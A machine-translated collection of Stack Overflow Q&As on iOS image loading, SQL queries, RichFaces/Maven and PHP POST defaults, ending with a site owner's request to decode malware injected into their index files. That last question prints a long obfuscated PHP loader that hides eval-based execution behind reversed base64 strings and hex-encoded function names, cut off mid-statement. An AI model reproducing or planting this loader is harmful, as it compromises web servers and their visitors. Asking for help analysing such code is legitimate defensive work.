正如您所看到的，这很重要，我建议您使用现有`UIImageView`类别，例如作为[`SDWebImage`](https://github.com/rs/SDWebImage)or的一部分提供的类别[`AFNetworking`](https://github.com/AFNetworking/AFNetworking)。恕我直言，前者更丰富一些（例如提供磁盘缓存），但如果您正在做大量的网络工作并且想要坚持使用单一框架，`AFNetworking`那么它也做得很好。

后来你问：

> 特别是，我应该在下载后调整/替换 UIImageview 的大小，还是应该调整图像的大小以适应 UIImageView。请注意，调整/替换 UIImageView 也会调整/替换 UITableViewCell。它会引起任何问题吗？

1.  如果您的图像大于单元格的缩略图视图所需的大小，您有两种方法。首先，您可以使用`contentMode`of[`UIViewContentModeScaleAspectFit`或`UIViewContentModeScaleAspectFill`](http://developer.apple.com/library/ios/documentation/UIKit/Reference/UIView_Class/UIView/UIView.html#//apple_ref/doc/c_ref/UIViewContentMode)（如果您使用`AspectFill`，请确保您也设置`clipsToBounds`为`YES`）。更好的是，您可以在下载后实际[调整图像大小。](https://stackoverflow.com/a/10491692/1271826)

2.  这是个人意见，但我认为`UIImageView`在单元格上有一个固定大小的 UX 更好，然后在异步图像下载完成后，只需设置`image`. `UIImageView`您希望图像在下载时优雅地出现在您的 UI 中，但您通常不希望在用户已经在阅读那里的内容时对视图进行不和谐的重新布局。如果您的设计绝对需要重新布局单元格，那么您可以调用[`reloadRowsAtIndexPaths`](http://developer.apple.com/library/ios/documentation/uikit/reference/UITableView_Class/Reference/Reference.html#//apple_ref/doc/uid/TP40006943-CH3-SW40).

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T16:27:13.417

在 a 中延迟加载图像的一种常见做法`UITableViewCell`是使用通知回调来通知`UITableViewCell`何时接收到图像。

本质上，您需要创建一个`UIImageView`具有 imageURL 字段的子类，该字段在更改时会触发对图像的请求，并使用它而不是标准`UIImageView`：

UIImageView 子类的接口：

```
@property (nonatomic, copy) NSString *imageURL; 
```

UIImageView 子类的实现：

```
//synthesize property
@synthesize imageURL = _imageURL;

- (void)setImageURL:(NSString *)imageURL {
    if(_imageURL)
        [[NSNotificationCenter defaultCenter] removeObserver:self name:_imageURL object:nil];
    _imageURL = [imageURL copy];
    //if imageURL is valid...
    if(_imageURL.length) {
        [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(didReceiveImage:) name:_imageURL object:nil];
        //fire off some asynchronous image fetch
        //when the image fetch completes, sent off a notification using the imageURL as the notification name
        //It's up to you to create the implementation for this yourself
        ... [MyImageManager fetchImage:_imageURL notificationName:_imageURL]; 
    }
}

- (void)didReceiveImage:(NSNotification*)notification
{
    //handle your received image here
    if([notification.object isKindOfClass:[UIImage class]])
    {
        self.myCustomImageView.image = notification.object;
    }
} 
```

然后在 UITableViewCell 类中重写 prepareForReuse 时：

```
- (void)prepareForReuse {
    [super prepareForReuse];
    self.myCustomImageView.imageURL = nil;
    self.myCustomImageView.image = nil;
    //do the rest of your prepareForReuse here:
    ...
} 
```

现在，就图像的整体大小调整与图像视图的大小调整而言，您应该做的是不理会 imageView 的大小，并使用该`contentMode`属性来处理结果图像的不同大小。您[可能的值](http://developer.apple.com/library/ios/documentation/uikit/reference/uiview_class/uiview/uiview.html#//apple_ref/c/tdef/UIViewContentMode)是：

```
UIViewContentModeScaleToFill,
UIViewContentModeScaleAspectFit,
UIViewContentModeScaleAspectFill,
UIViewContentModeRedraw,
UIViewContentModeCenter,
UIViewContentModeTop,
UIViewContentModeBottom,
UIViewContentModeLeft,
UIViewContentModeRight,
UIViewContentModeTopLeft,
UIViewContentModeTopRight,
UIViewContentModeBottomLeft,
UIViewContentModeBottomRight, 
```

每个都有各自的结果 - 您可能想要使用`UIViewContentModeScaleAspectFit`它，因为这将重新调整图像大小以适合 imageView，而不会扭曲它 - 这可能会在 imageView 的大小或顶部/底部留下空白边距。Aspect fill 会做类似的事情，只是它会将图像调整为足够大以填充整个 imageView，并且可能会切断图像的侧面或顶部/底部。Scale to fill 只会拉伸图像以填充 imageView。

# android - 比较 SQL 中的两个不同坐标（加法 SUM 和其他）

> ID：11583115
> 
> 赞同：-1
> 
> 时间：2012-07-20T16:10:07.967
> 
> 标签：android, sql, sqlite

我不想比较数据库中的两个坐标，但我不能使用加法或减法。我使用的数据库是 Android 上的 SQLite。

这是我的 SQL 请求：

```
SELECT m.numMag, nomMag, photoMag, URLMag, latitudeMag,
longitudeMag, numEns, numAdr 
FROM Mag m, Prix p 
WHERE m.numMag=p.numMag AND p.numProduit=1 
AND latitude <= SUM(48.453354+0.01) 
AND latitude >=SUM(48.453354-0.01)
AND longitude <= SUM(2.306644+0.06) 
AND longitude >= SUM(2.306644-0.06); 
```

当然这个要求是完全错误的，但这是我最后一次测试。有人可以帮助我吗？

其他信息：SUM（生成的浮点数，-/+number 已设置）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T16:16:21.770

SUM 是一个聚合函数，所以当你有一个 GROUP BY 时它可以工作。只需删除它。. .

```
SELECT m.numMag, nomMag, photoMag, URLMag, latitudeMag,
       longitudeMag, numEns, numAdr 
FROM Mag m, Prix p 
WHERE m.numMag=p.numMag AND p.numProduit=1 
      AND latitude <= (48.453354+0.01) 
      AND latitude >=(48.453354-0.01)
      AND longitude <= (2.306644+0.06) 
      AND longitude >= (2.306644-0.06); 
```

您还应该使用正确的连接语法，并且可以简化以下之间的使用：

```
SELECT m.numMag, nomMag, photoMag, URLMag, latitudeMag,
       longitudeMag, numEns, numAdr 
FROM Mag m join
     Prix p 
     on m.numMag=p.numMag 
WHERE p.numProduit=1 and
      latitude between (48.453354-0.01) and (48.453354+0.01) and
      longitude between (2.306644-0.06) and (2.306644+0.06) 
```

# sql - sql 返回行的乘积而不是表中实际的行

> ID：11583119
> 
> 赞同：0
> 
> 时间：2012-07-20T16:10:17.680
> 
> 标签：sql, sql-server

我有以下在 SQL Server 中执行的 sql。我得到`tx`表中行的乘积。`tx`表中有 6 行，`appt`表中没有匹配的行。`master`表有一行包含个人信息，但是当我执行这个 sql 时，我得到 36 行而不是为每条记录获取一行。我得到了这个人的行数。我知道我在`where`子句中需要另一个条件，但我没有尝试过：

```
SELECT "tx"."today",
       "tx"."ada_no",
       "tx"."tth_no",
       "tx"."surface",
       "tx"."billed",
       "tx"."ins_pays",
       "tx"."ins_pays1",
       "tx"."balance1",
       "tx"."dr_no",
       "tx"."status",
       "tx"."coma",
       "tx"."comb",
       "tx"."notes",
       "tx"."appt",
       "tx"."w_date",
       "tx"."thekey",
       "tx"."service",
       "tx"."time",
       "appt"."doa",
       "master"."wip",
       LEFT(ampm, 1) AS premed,
       "master"."med_hx",
       "tx"."comc",
       "tx"."comd",
       "tx"."i_bal2",
       "tx"."ins_pays2",
       "tx"."i_bal3",
       "tx"."ins_pays3"
FROM   "tx"
       LEFT OUTER JOIN "appt"
         ON "tx"."appt_key" = "appt"."appt_key",
       "master"
       LEFT OUTER JOIN "tx" tx1
         ON "master"."master_key" = "tx1"."master_key"
WHERE  "master"."master_key" = CAST(71563.00 AS NUMERIC(10, 2))
       AND "master"."master_key" = "tx"."master_key"
ORDER  BY "tx"."time" ASC,
          "tx"."appt" ASC 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T16:22:33.203

Don't mix old style and new style JOINs. In fact, you should avoid old style joins using commas entirely. It's not ANSI standard and can lead to confusing code. According to SQL "master" is being included as a CROSS JOIN to "tx" because you have nothing that relates it to the tx table. The cross join will cause the number of rows returned to be the multiplication product of the two pieces as each repeat for every record. Effectively your current query is this:

```
SELECT     tx.today, tx.ada_no, tx.tth_no, tx.surface, tx.billed, tx.ins_pays, tx.ins_pays1, tx.balance1, tx.dr_no, tx.status, tx.coma, tx.comb, tx.notes, tx.appt, 
                      tx.w_date, tx.thekey, tx.service, tx.time, appt.doa, master.wip, LEFT(ampm, 1) AS premed, master.med_hx, tx.comc, tx.comd, tx.i_bal2, tx.ins_pays2, 
                      tx.i_bal3, tx.ins_pays3
FROM         tx LEFT OUTER JOIN
                      appt ON tx.appt_key = appt.appt_key CROSS JOIN
                      master LEFT OUTER JOIN
                      tx AS tx1 ON master.master_key = tx1.master_key
WHERE     (master.master_key = 71563.00) AND (master.master_key = tx.master_key)
ORDER BY tx.time, tx.appt 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T16:26:14.047

Part of your issue is that you are missing JOIN types - you are using JOIN syntax and you are also joining the tables with a comma. You syntax should be like the following:

```
FROM tx 
LEFT OUTER JOIN appt 
  ON tx.appt_key = appt.appt_key
LEFT JOIN master 
   ON master.master_key = tx.master_key
LEFT OUTER JOIN tx tx1
  ON master.master_key = tx1.master_key 
```

So your full query would be:

```
SELECT  tx.today
  , tx.ada_no 
  , tx.tth_no 
  , tx.surface
  , tx.billed 
  , tx.ins_pays 
  , tx.ins_pays1 
  , tx.balance1 
  , tx.dr_no
  , tx.status 
  , tx.coma
  , tx.comb 
  , tx.notes 
  , tx.appt 
  , tx.w_date 
  , tx.thekey 
  , tx.service 
  , tx.time
  , appt.doa 
  , master.wip
  , left(ampm,1) as premed
  , master.med_hx
  , tx.comc
  , tx.comd 
  , tx.i_bal2
  , tx.ins_pays2
  , tx.i_bal3
  , tx.ins_pays3
FROM tx 
LEFT OUTER JOIN appt 
  ON tx.appt_key = appt.appt_key
LEFT JOIN master 
   ON master.master_key = tx.master_key
LEFT OUTER JOIN tx tx1
  ON master.master_key = tx1.master_key
WHERE master.master_key = CAST(71563.00 AS NUMERIC(10,2)) 
ORDER BY tx.time ASC
  , tx.appt ASC 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-20T16:16:35.100

没有看到你的数据很难说，但我猜你看到这些结果是因为`tx`它本身就加入了。

我很难理解您到底需要什么，但如果包含您当前的数据和所需的输出，我们可能会为您指明正确的方向。

在旁注中，我认为您没有任何理由在其中包含所有这些双引号。如果您删除这些并格式化您的查询，那么这里的人们会更容易帮助您。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-20T16:17:21.277

啊，太快输入答案的变幻莫测。*由于使用左外部*构造的连接结构，原始查询生成了太多记录。显然，交叉连接会创建每个相关表的叉积。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-20T16:17:38.290

尝试这个

```
FROM "tx" LEFT OUTER JOIN "appt" ON "tx"."appt_key" = "appt"."appt_key" inner join
"master" 
on "master"."master_key" = CAST(71563.00 AS NUMERIC(10,2))  
AND "master"."master_key" = "tx"."master_key" 
LEFT OUTER JOIN "tx" tx1 ON "master"."master_key" = "tx1"."master_key"      

ORDER BY "tx"."time"          ASC,           "tx"."appt"          ASC 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-07-20T16:31:34.617

主人这个词前面的逗号对我来说不合适。

```
FROM   "tx"        
LEFT OUTER JOIN "appt"          
  ON "tx"."appt_key" = "appt"."appt_key",   -- try without this comma     
"master"        
LEFT OUTER JOIN "tx" tx1          
  ON "master"."master_key" = "tx1"."master_key" 
```

# jsf - 为什么某些 RichFaces 工件不在 Maven Central 中？

> ID：11583122
> 
> 赞同：1
> 
> 时间：2012-07-20T16:10:31.867
> 
> 标签：jsf, maven, richfaces, repository

为了`org.richfaces.ui.validator:richfaces-ui-validator-ui`在我的构建中获得 RichFaces Validator 工件（4.2.2 Final），我必须在我的 POM 中添加[https://repository.jboss.org/nexus/content/repositories/releases作为存储库。](https://repository.jboss.org/nexus/content/repositories/releases)

在我的构建抱怨它找不到那个工件并且[在 Maven Central 中搜索“richfaces”](http://search.maven.org/#search%7Cga%7C1%7Crichfaces)没有返回 RichFaces 工件的“完整集”之后，我就去了那个地方。

只是好奇是否有人知道如何选择 RichFaces 工件包含在 Maven Central 中。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-24T12:53:21.933

简短的回答：如果你需要这个，你可能做错了什么。Maven Central 应该具有使用 RichFaces 创建应用程序所需的所有依赖项。

我试图单独添加 ui-validator 组件（未部署到 Maven 中心），但错误地假设我需要将它明确标识为依赖项。包括它给我带来了相当大的痛苦（`csv.xml`部署中的多个文件）。

最后，我意识到 ui-components 依赖项（安装在 Maven Central*上*）捆绑了验证依赖项（以及许多其他依赖项）。

最后，无论如何我都没有得到我正在寻找的组件。我认为我需要`rich:ajaxValidator`，但这只是因为我试图在 4.x 应用程序中使用来自 3.x RichFaces Showcase 的代码（并且该标签在 4.x 中被删除）。

# php - PHP：检查发布的变量是否存在或分配空值

> ID：11583126
> 
> 赞同：4
> 
> 时间：2012-07-20T16:10:45.070
> 
> 标签：php, conditional-operator

这可以在 JavaScript 中使用 isNAN 而不是 !isset 来完成。使用下面的示例 - 两种形式都发布到我的脚本中，一种没有值，一种有值。如果 post var 不存在，下面的代码是在 PHP 中执行此操作的正确方法吗？

**$mycheck = !isset($_POST['value']) ？0 : $_POST['value'];**

```
<? 
if($_POST) :
  $mycheck = !isset($_POST['value']) ? 0 : $_POST['value'];
  echo $mycheck;
endif;
?>

<!-- send value-->
<form action="" method="post">
  <select name="value">
    <option value="0">0</option>
    <option value="5">5</option>
  </select>
  <input type="submit" name="submit">
</form>

<!-- doesn't send value-->
<form action="" method="post">
  <input name="different_var">
  <input type="submit" name="submit">
</form> 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-20T16:11:29.390

是的，这是一种可以接受的设置默认值的方式。

PHP 5.3 中引入的另一种方法是省略三元表达式的中间参数：

```
$mycheck = $_POST['value'] ?: 0; 
```

`$_POST['value']`但是，如果未设置，这可能会引发尝试使用不存在的键访问数组的通知。因此，您的原始方法更容易被接受。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T16:12:30.010

它有效，但有一种更简洁的编写方式。

从 PHP 5.3 开始，您可以将三元运算缩短为两个表达式，如下所示：

```
$mycheck = $_POST['value'] ?: 0; 
```

它基本上意味着你已经拥有的东西。

# php - 如何解码这个恶意软件 PHP 脚本？

> ID：11583132
> 
> 赞同：-5
> 
> 时间：2012-07-20T16:11:03.303
> 
> 标签：php, malware

我只是注意到我的所有索引文件在我的服务器中都有以下代码。我想知道我该如何解码。并找出谁在使用此代码？请你能帮我如何解码这个。

```
 <?php @error_reporting(0); if (!isset($eva1fYlbakBcVSir)) {$eva1fYlbakBcVSir = "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pO31ldmFsKGV2YWxsd2hWZklWbldQYlQoJzspKSI9QVNmN2t5YU5SbWJCUlhXdk5uUmpGVVdKeFdZMlZHSm9VR1p2TldaazlGTjJVMmNoSkdJdUpYZDBWbWM3QlNLcjFFWnVGRWRaOTJjR05XUVpsRWJoWlhaa2dpUlRKa1pQbDBaaFJGYlBCRmFPMUViaFpYWmc0MmJwUjNZdVZuWiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIjdraUk5MEVTa2htVXpNbUlvWTBVQ1oyVEpkV1lVeDJUUWhtVE54V1kyVldQWE5GWm5ORVpWbFZhRk5WYmh4V1kyVkdKIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiN2tpSTkwVFFqQmpVSUZtSW9ZMFVDWjJUSmRXWVV4MlRRaG1UTnhXWTJWV1BYWlZjaFpsY3BWMlZVeFdZMlZHSiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIjdraUk5UXpWaEpDS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGwxalFtaEZSVmRFZGlWRlpDeFdZMlZHSiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIj09d09wSVNQOUVWUzJSMlZKSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDFUWlZwblJ1VjJRc0oyZFJ4V1kyVkdKIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiPXNUWHBJU1YxVWxVSVpFTVlObFZ3VWxWNVlVVlZKbFJUSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbHRsVUZabFVGTjFYazB6UW1OMlpOQm5kcE5YVHl4V1kyVkdKIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiPXNUS3BraWNxTmxWakYwYWhSR1daUlhNaFpYWmtnaWRsSm5jME5IS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGxoQ2JoWlhaIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiPXNUS3BJU1A5YzJZc2hYYlpSblJ0VmxJb1kwVUNaMlRKZFdZVXgyVFFobVROeFdZMlZHSXNraUkwWTFSYVZuUlhkbElvWTBVQ1oyVEpkV1lVeDJUUWhtVE54V1kyVkdJc2tpSTlrRVdhSkRiSEZtYUtoVldtWjBWaEpDS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGxCQ0xwSUNNNTBXVVA1a1ZVSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbEJDTHBJU1BCNTJZeGduTVZKQ0tHTmxRbTlVU25GR1ZzOUVVbzVVVHNGbWRsQkNMcElDYjRKalcybGpNU0pDS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGxoU2VoSm5jaEJTUGdRSFVFaDJiemRFZHVSRWRVeFdZMlZHSiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIj09d09wa2lJNVFIVkxwblVEdGtlUzVtWXNKbGJpWm5UeWdGTVdKaldtWjFSaUJuV0hGMVowMDJZeElGV2FsSGRJbEVjTmhrU3ZSVGJSMWtUeUlsU3NCRFZhWjBNaHBrU1ZSbFJrWmtZb3BGV2FkR055SUdjU05UVzFabGJhSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbGhDYmhaWFoiKGVkb2NlZF80NmVzYWIobGF2ZScpKTtldmFsKGV2YWxsd2hWZklWbldQYlQoJzspKSI9PXdPcGdDTWtSR0pnMERJWXBIUnloMVRJZDJTbnhXWTJWR0oiKGVkb2NlZF80NmVzYWIobGF2ZScpKTtldmFsKGV2YWxsd2hWZklWbldQYlQoJzspKSI9PVFmOXREYWpGRVRhdEdWQ1pGYjFGM1p6TjNjc0ZtZGxSQ0l2aDJZbHRUWHhzRmFqRkVUYXRHVkNaRmIxRjNaek4zY3NGbWRsUkNJOUFDYWpGRVRhdEdWQ1pGYjFGM1p6TjNjc0ZtZGxSQ0k3a0NhakZFVGF0R1ZDWkZiMUYzWnpOM2NzRm1kbFJDTGxWbGVHNVdaRHhtWTNGRmJoWlhaa2dTWms5R2J3aFhaZzBESW9OV1FNcDFhVUprVnNWWGNuTjNjenhXWTJWR0o3bFNLbFZsZUc1V1pEeG1ZM0ZGYmhaWFprd0NhakZFVGF0R1ZDWkZiMUYzWnpOM2NzRm1kbFJDS3lSM2N5UjNjb0FpWnB0VEtwMFZLaVVsVHhRVlM1WVVWVkpsUlRKQ0tHTmxRbTlVU25GR1ZzOUVVbzVVVHNGbWRsdGxVRlpsVUZOMVhrZ1NaazkyWXVWR2J5Vm5McElTT24xbVNpZ2lSVEprWlBsMFpoUkZiUEJGYU8xRWJoWlhadWt5UW1OMlpOQm5kcE5YVHl4V1kyVkdKb1VHWnZObWJseG1jMTVTS2lrVFN0cGtJb1kwVUNaMlRKZFdZVXgyVFFobVROeFdZMlZtTGRsaUk5a2tSU1ZrUndnbFJTRkRWT1oxYVZKQ0tHTmxRbTlVU25GR1ZzOUVVbzVVVHNGbWRsdGxVRlpsVUZOMVhrNFNLaTBETVVGbUlvWTBVQ1oyVEpkV1lVeDJUUWhtVE54V1kyVm1McElTUDRRMFlpZ2lSVEprWlBsMFpoUkZiUEJGYU8xRWJoWlhadWtpSXZKa2JNSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDVpUW1oRlJWZEVkaVZGWkN4V1kyVkdKdWtpSTkwemRNSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDVDVzZSa2NZOUVTbnQwWnNGbWRsUmlMcElTUDRrSFRpZ2lSVEprWlBsMFpoUkZiUEJGYU8xRWJoWlhadWtpSTkwelpQSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDV5VldGWFlXSlhhbGRGVnNGbWRsUkNLdUpFVGpkVVNKOVVXeHRXU0MxVVJYeFdZMlZHSTlBQ2FqRkVUYXRHVkNaRmIxRjNaek4zY3NGbWRsUkNJN2tDTXdnRE14c1NLb1VXYnBSSExwa2lJOTBFU2tobVV6TW1Jb1kwVUNaMlRKZFdZVXgyVFFobVROeFdZMlZHSzFRV2JzYzFVa2QyUWtWVldwVjBVdEZHYmhaWFprZ1NacHQyYnZOR2RsTkhRZ3NISWxOSGJsQlNmN0JTS3BrU1hYTkZabk5FWlZsVmFGTlZiaHhXWTJWR0piVlVTTDkwVEQ5RkpvUVhaek5YYW9BaWN2QlNLcE1rWmpkV1R3WlhhejFrY3NGbWRsUkNJc0lTYXZJQ0l1QVNLMEJGUm85MmNIUm5iRVJIVnNGbWRsUkNJc0lDZmlnU1prOUdidzFXYWc0Q0lpOGlJb2cyWTBGV2JmZFdaeUJIS29ZV2EiKGVkb2NlZF80NmVzYWIobGF2ZScpKTskZXZhbFVkQ1hURFFFUm1XbkRTID0xODc5Mjt9";$eva1tYlbakBcVSir = "\x65\144\x6f\154\x70\170\x65";$eva1tYldakBcVSir = "\x73\164\x72\162\x65\166";$eva1tYldakBoVS1r = "\x65\143\x61\154\x70\145\x72\137\x67\145\x72\160";$eva1tYidokBoVSjr = "\x3b\51\x29\135\x31\133\x72\152\x53\126\x63\102\x6b\141\x64\151\x59\164\x31\141\x76\145\x24\50\x65\144\x6f\143\x65\144\x5f\64\x36\145\x73\141\x62\50\x6c\141\x76\145\x40\72\x65\166\x61\154\x28\42\x5c\61\x22\51\x3b\72\x40\50\x2e\53\x29\100\x69\145";$eva1tYldokBcVSjr=$eva1tYldakBcVSir($eva1tYldakBoVS1r);$eva1tYldakBcVSjr=$eva1tYldakBcVSir($eva1tYlbakBcVSir);$eva1tYidakBcVSjr = $eva1tYldakBcVSjr(chr(2687.5*0.016), $eva1fYlbakBcVSir);$eva1tYXdakAcVSjr = $eva1tYidakBcVSjr[0.031*0.061];$eva1tYidokBcVSjr = $eva1tYldakBcVSjr(chr(3625*0.016), $eva1tYidokBoVSjr);$eva1tYldokBcVSjr($eva1tYidokBcVSjr[0.016*(7812.5*0.016)],$eva1tYidokBcVSjr[62.5*0.016],$eva1tYldakBcVSir($eva1tYidokBcVSjr[0.061*0.031]));$eva1tYldakBcVSir = "";$eva1tYldakBoVS1r = $eva1tYlbakBcVSir.$eva1tYlbakBcVSir;$eva1tYidokBoVSjr = 